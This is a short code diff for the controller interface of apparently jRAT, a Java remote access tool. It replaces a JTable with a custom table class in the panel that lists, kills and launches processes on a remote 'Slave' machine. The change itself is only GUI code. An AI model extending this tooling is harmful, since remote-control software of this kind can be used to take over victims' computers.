@@ -15,6 +15,7 @@ import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet19ListProcesses;
 import se.jrat.client.packets.outgoing.Packet20KillProcess;
 import se.jrat.client.packets.outgoing.Packet38RunCommand;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.renderers.table.ProcessTableRenderer;
 import se.jrat.client.utils.IconUtils;
 import se.jrat.client.utils.Utils;
@@ -102,7 +103,7 @@ public class PanelControlRemoteProcess extends PanelControlParent {
 		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE).addGroup(groupLayout.createSequentialGroup().addContainerGap(176, Short.MAX_VALUE).addComponent(btnClearList).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnCreateProcess).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnKillSelected).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnRefresh).addContainerGap()));
 		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 296, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnRefresh).addComponent(btnKillSelected).addComponent(btnCreateProcess).addComponent(btnClearList)).addGap(18)));
 
-		table = new JTable();
+		table = new DefaultJTable();
 		table.setDefaultRenderer(Object.class, new ProcessTableRenderer());
 		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Name", "Process ID", "Session name / Time", "Memory Usage / Info" }));
 		table.getColumnModel().getColumn(0).setPreferredWidth(287);
